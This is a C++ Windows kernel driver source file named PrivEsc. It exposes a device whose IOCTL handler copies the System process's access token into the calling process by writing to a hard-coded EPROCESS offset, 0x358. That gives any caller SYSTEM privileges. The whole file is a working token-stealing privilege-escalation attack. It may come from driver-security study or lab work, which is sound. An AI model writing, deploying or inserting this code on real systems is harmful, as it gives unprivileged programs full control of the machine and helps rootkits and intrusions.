#include <ntifs.h>
#include <ntdef.h>
#include <ntddk.h>
#include "PrivEscCommon.h"

#define EX_FAST_REF_MASK 0xFFFFFFFFFFFFFFF0  //Mask to clear the lowest 4 bits (reference count)

typedef struct _DEVICE_EXTENSION {
    PEPROCESS SystemProcess;  // Pointer to the system process object
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;

void PrivEscUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS PrivEscCreate(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS PrivEscClose(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS PrivEscIOControl(PDEVICE_OBJECT, PIRP Irp);

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {

    DriverObject->DriverUnload = PrivEscUnload;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = PrivEscCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = PrivEscClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PrivEscIOControl;

    PDEVICE_OBJECT DeviceObject;
    UNICODE_STRING DevName = RTL_CONSTANT_STRING(L"\\Device\\PrivEsc");
    NTSTATUS status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &DevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed in IoCreateDevice (0x%X)\n", status));
        return status;
    }

    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\PrivEsc");
    status = IoCreateSymbolicLink(&symLink, &DevName);

    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(DeviceObject);
        KdPrint(("Failed in IoCreateSymbolicLink (0x%X)\n", status));
        return status;
    }

    return STATUS_SUCCESS;
}

void PrivEscUnload(PDRIVER_OBJECT DriverObject) {

    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\PrivEsc");
    IoDeleteSymbolicLink(&symLink);

    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS PrivEscCreate(PDEVICE_OBJECT, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS PrivEscClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    // Retrieve the current process from the IRP or device object
    //PEPROCESS CurrentProcess = IoGetCurrentProcess();

    // Dereference the token in IRP_MJ_CLOSE, but I need to exclude the refCnt using the mask
    //PACCESS_TOKEN currentToken = (PACCESS_TOKEN)((*((char*)CurrentProcess + 0x358)) & EX_FAST_REF_MASK);

    

    // Get the system process from device extension
    PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    PEPROCESS SystemProcess = DeviceExtension->SystemProcess;

    // Ensure that the system process is valid before dereferencing
    if (SystemProcess != NULL) {
        ObDereferenceObject(SystemProcess);
    }

    // Complete the IRP
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS PrivEscIOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    auto dic = &stack->Parameters.DeviceIoControl;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;

    switch (dic->IoControlCode) {
    case IOCTL_PRIVESC: {
        PEPROCESS CurrentProcess = IoGetCurrentProcess();
        PEPROCESS SystemProcess = NULL;
        PACCESS_TOKEN SystemToken = NULL;
        PACCESS_TOKEN CurrentToken = NULL;

        // Attempt to get the system process by ID (ID for System Process is 4)
        status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to find System process (0x%08X)\n", status);
            break;
        }

        // Save the system process for later dereferencing in close
        PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
        DeviceExtension->SystemProcess = SystemProcess;

        // Reference system token
        SystemToken = PsReferencePrimaryToken(SystemProcess);
        if (SystemToken == NULL) {
            DbgPrint("Failed to get the primary token for the System process\n");
            ObDereferenceObject(SystemProcess);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        // Reference current process token
        CurrentToken = PsReferencePrimaryToken(CurrentProcess);
        if (CurrentToken == NULL) {
            DbgPrint("Failed to get the primary token for the current process\n");
            PsDereferencePrimaryToken(SystemToken);
            ObDereferenceObject(SystemProcess);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        // Replace current process's token with the system token
        *(PACCESS_TOKEN*)((char*)CurrentProcess + 0x358) = SystemToken;

        // Tokens are referenced throughout the function, so no immediate dereferencing
        DbgPrint("Successfully replaced the current process's token with the system token\n");

        status = STATUS_SUCCESS;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
